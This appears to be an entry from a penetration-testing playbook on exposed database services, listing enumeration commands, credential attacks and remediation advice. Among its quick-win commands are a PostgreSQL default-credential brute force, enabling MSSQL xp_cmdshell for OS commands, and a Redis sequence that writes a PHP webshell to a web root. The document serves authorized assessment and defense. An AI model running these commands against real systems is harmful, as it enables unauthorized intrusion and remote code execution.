---
id: databases
technology: "Databases (MSSQL/MySQL/PG/Mongo/Redis)"
domain: IT
safety_class: safe
severity: critical
life_safety: false
match:
  ports: [1433, 3306, 5432, 27017, 6379]
  banners:
    - "microsoft sql server"
    - "mysql"
    - "mariadb"
    - "postgresql"
    - "mongodb"
    - "+PONG"
    - "redis_version"
    - "informational: login failed"
    - "mysql_native_password"
    - "pg_hba.conf"
    - "mongod starting"
  markers:
    - "dbms_error"
    - "sql server native client"
    - "mongod"
    - "ismaster"
    - "isMaster"
    - "replica set"
    - "NOAUTH Authentication required"
quick_wins:
  - cmd: "nmap -sV -p 1433,3306,5432,27017,6379 --script=banner {host}"
    safety: safe
    note: "Version banner grab across all five DB ports — read-only, no auth attempted"
  - cmd: "nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password {host}"
    safety: safe
    note: "MSSQL: enumerate instance name, version, and test for blank SA password (no writes)"
  - cmd: "nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-enum {host}"
    safety: safe
    note: "MySQL/MariaDB: server version, auth plugin, test for anonymous/empty-password login"
  - cmd: "nmap -p 5432 --script pgsql-brute --script-args brute.mode=user,userdb=/usr/share/wordlists/metasploit/postgres_default_userpass.txt {host}"
    safety: intrusive
    note: "PostgreSQL: default-credential brute (postgres/postgres, postgres/password) — generates auth log noise"
  - cmd: "mongosh --host {host} --port 27017 --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null"
    safety: safe
    note: "MongoDB: attempt unauthenticated listDatabases — confirms no-auth exposure without reading collection data"
  - cmd: "redis-cli -h {host} -p 6379 PING && redis-cli -h {host} -p 6379 INFO server"
    safety: safe
    note: "Redis: PING + INFO server — confirms unauthenticated access and reveals version/OS/config path"
  - cmd: "nxc mssql {host} -u sa -p '' --local-auth -x 'whoami'"
    safety: intrusive
    note: "MSSQL: NetExec tests blank SA cred and runs xp_cmdshell whoami if enabled — auth event logged"
  - cmd: "nxc mssql {host} -u sa -p '' --local-auth --enable-xpcmdshell"
    safety: disruptive
    note: "MSSQL: enables xp_cmdshell stored procedure — state-changing; gates OS-command execution, gated action"
  - cmd: "redis-cli -h {host} -p 6379 CONFIG SET dir /var/www/html && redis-cli -h {host} -p 6379 CONFIG SET dbfilename shell.php && redis-cli -h {host} -p 6379 SET payload '<?php system($_GET[\"cmd\"]); ?>' && redis-cli -h {host} -p 6379 BGSAVE"
    safety: disruptive
    note: "Redis: webshell write via CONFIG SET + BGSAVE — writes files to disk, disruptive; confirm scope before executing"
  - cmd: "python3 -m impacket.mssqlclient {host}/sa:@{host} -windows-auth"
    safety: intrusive
    note: "Impacket mssqlclient: interactive MSSQL session as SA with blank password — interactive auth attempt"
references:
  - "CVE-2020-1472"
  - "CVE-2019-3822"
  - "CVE-2021-33026"
  - "CVE-2022-0543"
  - "CVE-2023-28879"
  - "CISA KEV CVE-2022-0543"
  - "CISA KEV CVE-2019-3822"
mitre: "T1190, T1078.001, T1505.001"
---
# Databases (MSSQL / MySQL / PostgreSQL / MongoDB / Redis) guidance

Database services are among the highest-value targets in any network engagement. When exposed on their native ports — MSSQL on 1433, MySQL/MariaDB on 3306, PostgreSQL on 5432, MongoDB on 27017, and Redis on 6379 — they represent direct paths to sensitive data exfiltration, credential harvesting, and often OS-level command execution. Default or blank credentials remain disturbingly common, particularly for SA on MSSQL, root on MySQL with no password, postgres/postgres on PostgreSQL, and completely unauthenticated MongoDB or Redis instances reachable over the network.

Begin every database assessment with safe, read-only enumeration: banner grabs via nmap NSE scripts confirm version and configuration details without generating significant log noise or altering state. For MongoDB and Redis specifically, a single unauthenticated command (listDatabases or PING/INFO) immediately confirms whether the service is exposed with no authentication — a critical finding requiring no further intrusive steps to document. Pay attention to version banners: EOL versions of MySQL 5.x, PostgreSQL 9.x, and older MongoDB 3.x/4.x instances frequently carry known RCE or privilege escalation CVEs.

Intrusive steps should be gated on explicit scope confirmation. Default-credential testing against MSSQL SA, MySQL root, and PostgreSQL postgres accounts generates authentication log entries and may trigger account lockouts if policies are in place. NetExec (nxc) is the recommended tool for structured credential sprays with clean output. If SA access is confirmed on MSSQL, xp_cmdshell enablement is a disruptive action — it modifies server configuration and provides OS command execution as the SQL Server service account. Redis BGSAVE-based webshell writes and CONFIG SET directory manipulation are likewise disruptive and must be explicitly authorized before execution.

Remediation priorities: require strong authentication on all database ports and block external network access via firewall rules so these ports are never reachable from untrusted segments. Disable xp_cmdshell on MSSQL by default, require requirepass on Redis, and enforce authentication on MongoDB via the security.authorization: enabled setting. Rotate all default credentials immediately and enforce least-privilege database user roles to limit blast radius if credentials are compromised.
